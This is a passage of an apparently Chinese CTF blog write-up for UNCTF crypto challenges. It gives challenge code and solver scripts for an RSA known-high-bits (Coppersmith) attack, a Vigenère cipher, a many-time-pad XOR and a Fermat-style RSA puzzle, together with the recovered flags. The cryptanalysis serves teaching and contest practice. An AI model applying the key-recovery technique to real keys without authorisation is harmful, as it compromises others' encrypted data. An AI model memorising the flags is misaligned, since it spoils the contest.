class="line">            msg = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># 小写结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span> + flag)</span><br><span class="line">    <span class="comment"># 大写结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span> + flag.upper())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;C:/Users/lenovo/Desktop/今晚吃什么.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">a = f.readlines()</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a[<span class="number">0</span>]:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            res += <span class="string">&#x27;b&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res += <span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line">decrypt_26(res)</span><br><span class="line">b = <span class="string">&#x27;QQQAQAQQQQAQAAQQAAAQAQQQQQAAQAQAQQQAQQQAQQAQAAQQAAQAAQQ&#x27;</span></span><br><span class="line">res2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;Q&#x27;</span>:</span><br><span class="line">        res2 += <span class="string">&#x27;a&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res2 += <span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(res2)</span><br><span class="line">decrypt_24(res2)</span><br><span class="line"><span class="comment"># UNCTF&#123;CRYPROISFUN&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h3><p>题目：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">assert</span> flag.startwith(<span class="string">b&quot;flag&#123;&quot;</span>)</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">c=<span class="number">6423951485971717307108570552094997465421668596714747882611104648100280293836248438862138501051894952826415798421772671979484920170142688929362334687355938148152419374972520025565722001651499172379146648678015238649772132040797315727334900549828142714418998609658177831830859143752082569051539601438562078140</span> </span><br><span class="line">n=<span class="number">102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553</span></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getprime(<span class="number">512</span>)</span><br><span class="line">q=getprime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(c))</span><br><span class="line">tmp=random.randint(<span class="number">100</span>,<span class="number">300</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p&gt;&gt;tmp=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(p&gt;&gt;tmp))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#c=6423951485971717307108570552094997465421668596714747882611104648100280293836248438862138501051894952826415798421772671979484920170142688929362334687355938148152419374972520025565722001651499172379146648678015238649772132040797315727334900549828142714418998609658177831830859143752082569051539601438562078140 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#n=102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p&gt;&gt;200=8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857</span></span><br></pre></td></tr></table></figure>
<p>经典的已知p的高位攻击。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553</span></span><br><span class="line">p0 = <span class="number">8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line">kbits = pbits - p0.nbits()</span><br><span class="line">p0 = p0 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p0</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line"><span class="keyword">if</span> roots:        </span><br><span class="line">	p = p0+<span class="built_in">int</span>(roots[<span class="number">0</span>]) </span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;p: &quot;</span>+<span class="built_in">str</span>(p))</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;q: &quot;</span>+<span class="built_in">str</span>(n//p))</span><br><span class="line"><span class="comment"># p: 13150231070519276795503757637337326535824298772055543325920447062237907554543786311611680606624189166397403108357856813812282725390555389844248256805325917</span></span><br><span class="line"><span class="comment"># q: 7763324082495716852870824316200424018139567206154696104953385573761033160220038511251268217230653629388520339723337700045392099450472580225771046069366909</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=<span class="number">13150231070519276795503757637337326535824298772055543325920447062237907554543786311611680606624189166397403108357856813812282725390555389844248256805325917</span></span><br><span class="line">q=<span class="number">7763324082495716852870824316200424018139567206154696104953385573761033160220038511251268217230653629388520339723337700045392099450472580225771046069366909</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">d=invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m=<span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h3 id="Multi-table"><a href="#Multi-table" class="headerlink" title="Multi table"></a>Multi table</h3><p>题目：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_uppercase</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint,shuffle</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex,a2b_hex</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;UNCTF&#123;&#125;&quot;</span></span><br><span class="line">base_table=<span class="built_in">list</span>(ascii_uppercase)</span><br><span class="line"><span class="comment"># shuffle(base_table)</span></span><br><span class="line"><span class="built_in">print</span>(base_table)</span><br><span class="line"></span><br><span class="line">table=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    table[i]=ascii_uppercase[i:]+ascii_uppercase[:i]</span><br><span class="line"></span><br><span class="line">key=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    key.append(randint(<span class="number">0</span>,<span class="number">25</span>))</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">c=<span class="string">&#x27;&#x27;</span></span><br><span class="line">x=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> flag[i] <span class="keyword">in</span> ascii_uppercase:</span><br><span class="line">        c+=table[key[x%<span class="number">4</span>]][base_table.index(flag[i])]</span><br><span class="line">        x+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c+=flag[i]</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [&#x27;J&#x27;, &#x27;X&#x27;, &#x27;I&#x27;, &#x27;S&#x27;, &#x27;E&#x27;, &#x27;C&#x27;, &#x27;R&#x27;, &#x27;Z&#x27;, &#x27;L&#x27;, &#x27;U&#x27;, &#x27;K&#x27;, &#x27;Q&#x27;, &#x27;Y&#x27;, &#x27;F&#x27;, &#x27;N&#x27;, &#x27;V&#x27;, &#x27;T&#x27;, &#x27;P&#x27;, &#x27;O&#x27;, &#x27;G&#x27;, &#x27;A&#x27;, &#x27;H&#x27;, &#x27;D&#x27;, &#x27;W&#x27;, &#x27;M&#x27;, &#x27;B&#x27;]</span></span><br><span class="line"><span class="comment"># SDCGW&#123;MPN_VHG_AXHU_GERA_SM_EZJNDBWN_UZHETD&#125;</span></span><br></pre></td></tr></table></figure>
<p>简单的维吉尼亚，就这题能比前两道RSA少，不理解。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_uppercase</span><br><span class="line"></span><br><span class="line">base_table = [<span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;B&#x27;</span>]</span><br><span class="line">table = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    table[i] = ascii_uppercase[i:] + ascii_uppercase[:i]</span><br><span class="line">plaintext = <span class="string">&#x27;SDCGW&#123;MPN_VHG_AXHU_GERA_SM_EZJNDBWN_UZHETD&#125;&#x27;</span></span><br><span class="line">name = <span class="string">&#x27;UNCTF&#x27;</span></span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        <span class="keyword">if</span> table[j][base_table.index(name[i])] == plaintext[i]:</span><br><span class="line">            key.append(j)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext)):</span><br><span class="line">    <span class="keyword">if</span> plaintext[i] <span class="keyword">not</span> <span class="keyword">in</span> ascii_uppercase:</span><br><span class="line">        flag += plaintext[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">            <span class="keyword">if</span> plaintext[i] == table[key[x % <span class="number">4</span>]][j]:</span><br><span class="line">                flag += base_table[j]</span><br><span class="line">                x += <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># UNCTF&#123;WOW_YOU_KNOW_THIS_IS_VIGENERE_CIPHER&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="ezxor"><a href="#ezxor" class="headerlink" title="ezxor"></a>ezxor</h3><p>题目：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> key <span class="keyword">import</span> m,flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">OPT</span>(<span class="params">key,crypto</span>):</span><br><span class="line">    ciphertext=xor(key,crypto)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">ls=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    ls.append(m[i*<span class="number">42</span>:(i+<span class="number">1</span>)*<span class="number">42</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> ls:</span><br><span class="line">    k=OPT(flag,x).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(k)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1c2063202e1e795619300e164530104516182d28020005165e01494e0d</span></span><br><span class="line"><span class="string">2160631d325b3b421c310601453c190814162d37404510041b55490d5d</span></span><br><span class="line"><span class="string">3060631d325b3e59033a1252102c560207103b22020613450549444f5d</span></span><br><span class="line"><span class="string">3420277421122f55067f1207152f19170659282b090b56121701405318</span></span><br><span class="line"><span class="string">212626742b1434551b2b4105007f110c041c7f361c451e0a02440d010a</span></span><br><span class="line"><span class="string">75222a22230877102137045212300409165928264c091f131701484f5d</span></span><br><span class="line"><span class="string">21272d33661237441a7f005215331706175930254c0817091b4244011c</span></span><br><span class="line"><span class="string">303c2674311e795e103a05520d300600521831274c031f0b160148555d</span></span><br><span class="line"><span class="string">3c3d63232909355455300752033a17175e59372c1c0056111d01474813</span></span><br><span class="line"><span class="string">752b22272f1e2b10063e0816452b1e041c593b2c02005a450649440110</span></span><br><span class="line"><span class="string">396e2f3d201e795f137f07130c2b1e450510332f4c08170e17014d481b</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>多次一密，当空格和大写字母异或时会得到对应的小写字母，和小写字母异或时会得到对应的大写字母，根据这一特性对密文相互异或得到的结果也就是明文相互异或得到的结果进行统计，分析出其出现空格的位置，然后解得明文，明文再与密文异或后得到flag。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">ciphertexts = [</span><br><span class="line">    <span class="string">&#x27;1c2063202e1e795619300e164530104516182d28020005165e01494e0d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2160631d325b3b421c310601453c190814162d37404510041b55490d5d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3060631d325b3e59033a1252102c560207103b22020613450549444f5d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3420277421122f55067f1207152f19170659282b090b56121701405318&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;212626742b1434551b2b4105007f110c041c7f361c451e0a02440d010a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;75222a22230877102137045212300409165928264c091f131701484f5d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;21272d33661237441a7f005215331706175930254c0817091b4244011c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;303c2674311e795e103a05520d300600521831274c031f0b160148555d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3c3d63232909355455300752033a17175e59372c1c0056111d01474813&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;752b22272f1e2b10063e0816452b1e041c593b2c02005a450649440110&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;396e2f3d201e795f137f07130c2b1e450510332f4c08170e17014d481b&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">ciphertexts = [binascii.unhexlify(x) <span class="keyword">for</span> x <span class="keyword">in</span> ciphertexts]</span><br><span class="line">target_ciphertext = ciphertexts[-<span class="number">1</span>]</span><br><span class="line">suspect_num = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strxor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(x ^ y) <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = [<span class="number">0</span>] * <span class="number">50</span></span><br><span class="line">max_space_count = [<span class="number">0</span>] * <span class="number">50</span></span><br><span class="line"><span class="keyword">for</span> ciphertext_a <span class="keyword">in</span> ciphertexts:</span><br><span class="line">    space_suspect_counts = [<span class="number">0</span>] * <span class="built_in">len</span>(ciphertext_a)</span><br><span class="line">    <span class="keyword">for</span> ciphertext_b <span class="keyword">in</span> ciphertexts:</span><br><span class="line">        <span class="keyword">if</span> ciphertext_a == ciphertext_b:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        a_xor_b = strxor(ciphertext_a, ciphertext_b)</span><br><span class="line">        <span class="keyword">for</span> char_idx, xor_resulting_char <span class="keyword">in</span> <span class="built_in">enumerate</span>(a_xor_b):</span><br><span class="line">            ascii_null = <span class="string">&quot;\x00&quot;</span></span><br><span class="line">            <span class="keyword">if</span> xor_resulting_char.isalpha() <span class="keyword">or</span> xor_resulting_char == ascii_null:</span><br><span class="line">                space_suspect_counts[char_idx] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> char_idx, suspect_count <span class="keyword">in</span> <span class="built_in">enumerate</span>(space_suspect_counts):</span><br><span class="line">        <span class="keyword">if</span> suspect_count &gt;= max_space_count[char_idx]:</span><br><span class="line">            whitespace = <span class="built_in">ord</span>(<span class="string">&quot; &quot;</span>)</span><br><span class="line">            suspect_key = ciphertext_a[char_idx] ^ whitespace</span><br><span class="line">            <span class="keyword">for</span> ciphertext_b <span class="keyword">in</span> ciphertexts:</span><br><span class="line">                <span class="keyword">if</span> char_idx &lt; <span class="built_in">len</span>(ciphertext_b):</span><br><span class="line">                    <span class="keyword">if</span> isChr(ciphertext_b[char_idx] ^ suspect_key):</span><br><span class="line">                        max_space_count[char_idx] = suspect_count</span><br><span class="line">                        key[char_idx] = suspect_key</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">target_plaintext = [<span class="number">0</span>] * <span class="number">11</span></span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">        res += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="keyword">for</span> ciphertext_c <span class="keyword">in</span> ciphertexts:</span><br><span class="line">    target_plaintext[i] = strxor(ciphertext_c, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;明文<span class="subst">&#123;i&#125;</span>:<span class="subst">&#123;target_plaintext[i]&#125;</span>&quot;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">a = <span class="string">&#x27;1c2063202e1e795619300e164530104516182d28020005165e01494e0d&#x27;</span></span><br><span class="line">a = base64.b16decode(a.upper())</span><br><span class="line">c = <span class="string">&#x27;&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 对解得的明文中个别字符进行整理得到</span></span><br><span class="line">b = <span class="string">&#x27;In the flood of darkness, hop&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    c += <span class="built_in">chr</span>(i)</span><br><span class="line">res = xor(b, c)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># UNCTF&#123;Y0u_are_very_Clever!!!&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="Fermat"><a href="#Fermat" class="headerlink" title="Fermat"></a>Fermat</h3><p>题目：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag=<span class="string">b&#x27;UNCTF&#123;&#125;&#x27;</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">x=getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">assert</span> gift+x==x*p</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(gift)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 19793392713544070457027688479915778034777978273001720422783377164900114996244094242708846944654400975309197274029725271852278868848866055341793968628630614866044892220651519906766987523723167772766264471738575578352385622923984300236873960423976260016266837752686791744352546924090533029391012155478169775768669029210298020072732213084681874537570149819864200486326715202569620771301183541168920293383480995205295027880564610382830236168192045808503329671954996275913950214212865497595508488636836591923116671959919150665452149128370999053882832187730559499602328396445739728918488554797208524455601679374538090229259</span></span><br><span class="line"><span class="comment"># 